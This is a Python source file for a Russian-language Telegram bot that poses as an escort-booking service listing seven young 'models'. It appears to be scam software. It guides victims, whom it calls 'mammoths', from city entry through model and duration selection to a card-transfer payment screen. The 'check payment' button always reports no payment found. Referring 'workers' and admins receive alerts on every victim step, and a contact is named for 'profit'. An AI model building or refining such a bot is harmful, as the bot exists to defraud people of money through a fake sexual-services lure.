import telebot
import time
import re
import threading
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from database import *
from settings import *
from messages import *

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    telegram_id = message.from_user.id
    args = message.text.split()

    if len(args) > 1:
        referrer_id = args[1]

        if str(telegram_id) != referrer_id and user_exists(referrer_id):
            if not user_exists(telegram_id):
                add_user(telegram_id, message.from_user.username)
                add_referral(telegram_id, referrer_id)
                increment_referral_count(referrer_id)
                
                count = get_count_ref(referrer_id)
                bot.send_message(referrer_id, f"🎉 Мамонт зашел в бота: @{message.from_user.username} | {message.from_user.id} \nКоличество ваших мамонтов: {count}")
                for admin in admins_id:
                    bot.send_message(admin, f"🎉 Мамонт зашел в бота: @{message.from_user.username} | {message.from_user.id} \nКоличество мамонтов {referrer_id}: {count}")

                # Предлагаем новому пользователю ввести город
                bot.send_message(telegram_id, "👋🏻 Введите город, в котором вы собираетесь заказывать моделей:\n\nВнимание! Вводите город без ошибок, от этого зависит четкость подбора моделей.")
                bot.register_next_step_handler(message, get_city)
            else:
                bot.send_message(telegram_id, "❌ Вы уже зарегистрированы.")    
                show_main_menu(telegram_id, message)
        else:
            bot.send_message(telegram_id, "❌ Невозможно использовать свою ссылку как реферальную.")
    else:
        # Если пользователь зашел без реферальной ссылки
        if not user_exists(telegram_id):
            add_user(telegram_id, message.from_user.username)
            bot.send_message(telegram_id, "👋🏻 Введите город, в котором вы собираетесь заказывать моделей:\n\nВнимание! Вводите город без ошибок, от этого зависит четкость подбора моделей.")
            bot.register_next_step_handler(message, get_city)
        else:
            # Показываем стартовое меню
            show_main_menu(telegram_id, message)

def show_main_menu(telegram_id, message):
    """Функция для показа стартового меню"""
    bot.delete_message(message.chat.id, message.message_id - 1  )
    with open("photo/start.mp4", "rb") as photo:
        bot.send_animation(telegram_id, photo, caption=start_message, reply_markup=create_main_menu())  
        
@bot.message_handler(commands=['ref_get'])
def send_ref_link(message):
    try:
        print(f"Началась выдача реф ссылки! Воркер: {message.from_user.username}")
        telegram_id = message.from_user.id
        username_bot = bot.get_me().username

        if username_bot:
            ref_link = f"https://t.me/{username_bot}?start={telegram_id}"
            bot.send_message(telegram_id, f"👥 Ваша реферальная ссылка:\n`{ref_link}`", parse_mode='MarkDown')
            for admin in admins_id:
                bot.send_message(admin, f'📌 {message.from_user.username} Получил свою реферальную ссылку для ворка.')
        else:
            bot.send_message(telegram_id, "⚠️ Ошибка: не удалось получить username бота.")
            print("Ошибка: не удалось получить username бота.")
    except Exception as e:
        bot.send_message(telegram_id, "⚠️ Произошла ошибка при генерации реферальной ссылки.")
        print(f"Ошибка при генерации реферальной ссылки: {e}")  

def create_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2,resize_keyboard=True)
    markup.add("💝 Модели", "👤 Профиль", "🔍 Информация", "👨‍💻 Техническая поддержка")
    return markup

def get_city(message):
    telegram_id = message.from_user.id
    city = message.text
    worker_get = get_referral(telegram_id)

    with open("cities.txt", "r", encoding="utf-8") as file:
     cities = [line.strip() for line in file]

    city = re.sub(r'^(\w)(\w*)', lambda m: m.group(1).upper() + m.group(2).lower(), city)
    if city.upper() in [city.upper() for city in cities]:
        add_city(telegram_id, city)
        msg_success = bot.send_message(telegram_id, "✅ Город успешно добавлен.")
        bot.delete_message(telegram_id, msg_success.message_id)
        msg_returning = bot.send_message(telegram_id, "<i>Возвращаемся в главное меню...</i>", parse_mode='HTML')
        bot.delete_message(telegram_id, msg_returning.message_id)
        show_main_menu(telegram_id, message )
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт {message.from_user.username} добавил город {city}.")
    else:
        bot.send_message(telegram_id, "❌ Город не найден. Попробуйте еще раз.")
        bot.register_next_step_handler(message, get_city)
    
def send_models_list(telegram_id, user_data):
    models_keyboard = types.InlineKeyboardMarkup()
    model_one_button = types.InlineKeyboardButton(text="(#1) · Алёна · 19 лет", callback_data="model_one")
    model_two_button = types.InlineKeyboardButton(text="(#2) · Василиса · 25 лет", callback_data="model_two")
    model_three_button = types.InlineKeyboardButton(text="(#3) · Дарья · 21 год", callback_data="model_three")
    model_four_button = types.InlineKeyboardButton(text="(#4) · Ксения · 18 лет", callback_data="model_four")
    model_five_button = types.InlineKeyboardButton(text="(#5) · Марина · 23 года", callback_data="model_five")
    model_six_button = types.InlineKeyboardButton(text="(#6) · Кристина · 20 лет", callback_data="model_six")
    model_seven_button = types.InlineKeyboardButton(text="(#7) · Ирина · 23 года", callback_data="model_seven")
    
    models_keyboard.add(model_one_button)
    models_keyboard.add(model_two_button)
    models_keyboard.add(model_three_button)
    models_keyboard.add(model_four_button)
    models_keyboard.add(model_five_button)
    models_keyboard.add(model_six_button)
    models_keyboard.add(model_seven_button)
    
    models_format = models_message.format(city=user_data[2])
    bot.send_message(telegram_id, models_format, reply_markup=models_keyboard)

@bot.message_handler(content_types=['text'])
def func(message):
    telegram_id = message.from_user.id

    if message.text == "👤 Профиль":
        user_data = user_check(telegram_id)
        if user_data:
            with open("photo/profile.mp4", "rb") as photo:
                bot.send_animation(telegram_id, photo, caption=get_user_data(user_data))
        else:
            bot.send_message(telegram_id, "❌ Пользователь не найден.")

    elif message.text == "🔍 Информация":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(text="🛡 Гарантии", url="https://telegra.ph/Polzovatelskoe-soglashenie-dlya-klientov-01-14-2"))
        markup.add(types.InlineKeyboardButton(text="Отзывы", url="https://t.me/HeavenGrace_Reviews"))
        with open("photo/info.mp4", "rb") as photo:
            bot.send_animation(telegram_id, photo, caption=info_message, reply_markup=markup)

    elif message.text == "👨‍💻 Техническая поддержка":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(text="Написать", url="https://t.me/Dope_Support"))
        with open("photo/support.mp4", "rb") as photo:
            bot.send_animation(telegram_id, photo, caption=support_message, reply_markup=markup)

    elif message.text == "💝 Модели":
        user_data = user_check(telegram_id)

        if user_data:
            send_models_list(telegram_id, user_data)
        else:
            bot.send_message(telegram_id, "В данный момент нету моделей.")

model_prices_1_hour = {
    "model1": 6450,
    "model2": 5400,
    "model3": 5240,
    "model4": 6270,
    "model5": 5700,
    "model6": 7670,
    "model7": 3400
}


model_prices_2_hours = {
    "model1": 12700,
    "model2": 9450,
    "model3": 9170,
    "model4": 12450,
    "model5": 9975,
    "model6": 15890,
    "model7": 7000
}


model_prices_night = {
    "model1": 26400,
    "model2": 15260,
    "model3": 20960,
    "model4": 23100,
    "model5": 22800,
    "model6": 26200,
    "model7": 13000
}


selected_models = {}

def get_selected_model(telegram_id):
    return selected_models.get(telegram_id, "model1")

def set_selected_model(telegram_id, model):
    selected_models[telegram_id] = model

selected_durations = {}

def set_selected_duration(telegram_id, duration):
    selected_durations[telegram_id] = duration

def get_selected_duration(telegram_id):
    return selected_durations.get(telegram_id, "1 час") 


@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    telegram_id = call.from_user.id
    worker_get = get_referral(telegram_id)
    if call.data == "model_one":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #1.")
        set_selected_model(telegram_id, "model1")
        model1s = model1.format(city=user_check(telegram_id)[2])
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_1")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)
        with open("photo/model1.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model1s, reply_markup=markup)

    elif call.data == "model_two":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #2.")
        set_selected_model(telegram_id, "model2")
        model2s = model2.format(city=user_check(telegram_id)[2])
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_2")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)
        with open("photo/model2.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model2s, reply_markup=markup)

    elif call.data == "model_three":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #3.")
        set_selected_model(telegram_id, "model3")
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_3")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)  
        model3s = model3.format(city=user_check(telegram_id)[2])
        with open("photo/model3.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model3s, reply_markup=markup)

    elif call.data == "model_four":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #4.")
        set_selected_model(telegram_id, "model4")
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_4")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)      
        model4s = model4.format(city=user_check(telegram_id)[2])
        with open("photo/model4.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model4s, reply_markup=markup)

    elif call.data == "model_five":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #5.")
        set_selected_model(telegram_id, "model5")
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_5")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)
        model5s = model5.format(city=user_check(telegram_id)[2])
        with open("photo/model5.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model5s, reply_markup=markup)

    elif call.data == "model_six":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #6.")
        set_selected_model(telegram_id, "model6")
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_6")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)
        model6s = model6.format(city=user_check(telegram_id)[2])
        with open("photo/model6.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model6s, reply_markup=markup)

    elif call.data == "model_seven":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"👤 Мамонт @{call.from_user.username} выбрал модель #7.")
        set_selected_model(telegram_id, "model7")
        markup = types.InlineKeyboardMarkup(row_width=1)
        order_button = types.InlineKeyboardButton(text="📝 Оформить", callback_data="order_model_7")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup.add(order_button, back)
        model7s = model7.format(city=user_check(telegram_id)[2])
        with open("photo/model7.jpg", "rb") as photo:
            bot.send_photo(telegram_id, photo, caption=model7s, reply_markup=markup) 

    elif call.data == "order_model_1":
          with open("photo/model1.jpg", "rb") as photo:
           bot.delete_message(call.message.chat.id, call.message.message_id)
           if worker_get:
            bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #1.")
           markup_time = types.InlineKeyboardMarkup(row_width=1)
           time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
           time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
           time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
           back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
           markup_time.add(time_1, time_2, time_3, back)
           bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 1*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_2":
          with open("photo/model2.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #2.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back)
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 2*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_3":
          with open("photo/model3.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #3.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back)
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 3*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_4":
          with open("photo/model4.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #4.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back)
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 4*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_5":
          with open("photo/model5.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #5.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back)
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 5*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_6":
          with open("photo/model6.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #6.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back    )
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 6*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")

    elif call.data == "order_model_7":
          with open("photo/model7.jpg", "rb") as photo:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            if worker_get:
                bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату  модель #7.")
            markup_time = types.InlineKeyboardMarkup(row_width=1)
            time_1 = types.InlineKeyboardButton(text="🌇 1 час", callback_data="time_1")
            time_2 = types.InlineKeyboardButton(text="🏙 2 часа", callback_data="time_2")
            time_3 = types.InlineKeyboardButton(text="🌃 Ночь", callback_data="night")
            back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
            markup_time.add(time_1, time_2, time_3, back)
            bot.send_photo(call.message.chat.id, photo, caption="🛍️ *Модель 7*\n\nВыберите время, на которое вы хотите оформить модель:", reply_markup=markup_time, parse_mode="Markdown")
    elif call.data == "time_1":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату 1 час.")
        set_selected_duration(telegram_id, "1 час")
        markup_pay_method = types.InlineKeyboardMarkup(row_width=1)
        card = types.InlineKeyboardButton(text="💳 Перевод на карту", callback_data="card")
        cash = types.InlineKeyboardButton(text="💰 Наличные", callback_data="cash")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup_pay_method.add(card, cash, back)
        bot.send_message(call.message.chat.id, "Выберите способ оплаты:", reply_markup=markup_pay_method, parse_mode="HTML")
    elif call.data == "time_2":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату 2 часа.")
        set_selected_duration(telegram_id, "2 часа")
        markup_pay_method = types.InlineKeyboardMarkup(row_width=1)
        card = types.InlineKeyboardButton(text="💳 Перевод на карту", callback_data="card")
        cash = types.InlineKeyboardButton(text="💰 Наличные", callback_data="cash")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup_pay_method.add(card, cash, back)
        bot.send_message(call.message.chat.id, "Выберите способ оплаты:", reply_markup=markup_pay_method, parse_mode="HTML")
    elif call.data == "night":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        if worker_get:
            bot.send_message(worker_get, f"🔥 Мамонт @{call.from_user.username} выбрал на оплату ночь.")
        set_selected_duration(telegram_id, "ночь")
        markup_pay_method = types.InlineKeyboardMarkup(row_width=1)
        card = types.InlineKeyboardButton(text="💳 Перевод на карту", callback_data="card")
        cash = types.InlineKeyboardButton(text="💰 Наличные", callback_data="cash")
        back = types.InlineKeyboardButton(text="🔙 Назад", callback_data="back")
        markup_pay_method.add(card, cash, back)
        bot.send_message(call.message.chat.id, "Выберите способ оплаты:", reply_markup=markup_pay_method, parse_mode="HTML")
    elif call.data == "card":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        model = get_selected_model(telegram_id)
        duration = get_selected_duration(telegram_id)
        if duration == "1 час":
            price = model_prices_1_hour.get(model, 0)
        elif duration == "2 часа":
            price = model_prices_2_hours.get(model, 0)
        elif duration == "ночь":
            price = model_prices_night.get(model, 0)
        else:
            price = 0
        card_method = f"""
<b>♻️ Оплата банковской картой:</b>

Сумма: <code>{price}</code>₽

<b>◽️ Реквизиты для оплаты банковской картой:</b>
<b>┣</b> Имя Фамилия
<b>┣</b> БАНК
<b>┗</b> <code>Номер Карты</code>

⚠️ <i>Счет действителен 15 минут!</i>
⚠️ <i>ВАЖНО! Обязательно после пополнения, не забудьте нажать кнопку «проверить оплату» для пополнения баланса.</i>
⚠️ <i>Оплата заказа принимается строго через бота</i>
"""
        if worker_get:
            bot.send_message(worker_get, f"💫 Мамонт @{call.from_user.username} перешел на оплату картой.\n\n💰 Стоимость: {price} руб.")
        for admin in admins_id:
            bot.send_message(admin, f"👤 Мамонт @{call.from_user.username} перешел на оплату картой.\n\n💰 Стоимость: {price} руб.\n\nВоркер: {worker_get}")
        markup_check = types.InlineKeyboardMarkup(row_width=1)
        check_pay = types.InlineKeyboardButton(text="✅ Проверить оплату", callback_data="check")
        decline = types.InlineKeyboardButton(text="❌ Отмена", callback_data="back")
        markup_check.add(check_pay, decline)
        bot.send_message(telegram_id, card_method, reply_markup=markup_check, parse_mode="HTML")
    elif call.data == "cash":
        bot.answer_callback_query(callback_query_id=call.id, text="⚠️ Оплата наличными доступна только после подтверждения первого заказа в мерах безопасности.", show_alert=True)
    elif call.data == "check":
        for admin in admins_id:
            bot.send_message(admin, f"🌈 Мамонт @{call.from_user.username} нажал на кнопку проверки оплаты.\n\n⚙️ Воркер: {worker_get}")
        if worker_get:
          bot.send_message(worker_get, f"🌈 Мамонт @{call.from_user.username} нажал на кнопку проверки оплаты.\n\nДля уточнения профита обратиться - @kalipsom")
        bot.answer_callback_query(callback_query_id=call.id, text="❌ Платеж не найден\n\nОбратитесь в Техническую Поддержку", show_alert=True)
    elif call.data == "back":
        # Удаляем текущее сообщение и возвращаем список моделей
        bot.delete_message(call.message.chat.id, call.message.message_id)
        user_data = user_check(telegram_id) 
        send_models_list(telegram_id, user_data)



def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error running bot: {e}")
            time.sleep(1)  # wait for 1 second before retrying

if __name__ == '__main__':
    # create and start the bot thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    # keep the script running indefinitely
    while True:
        pass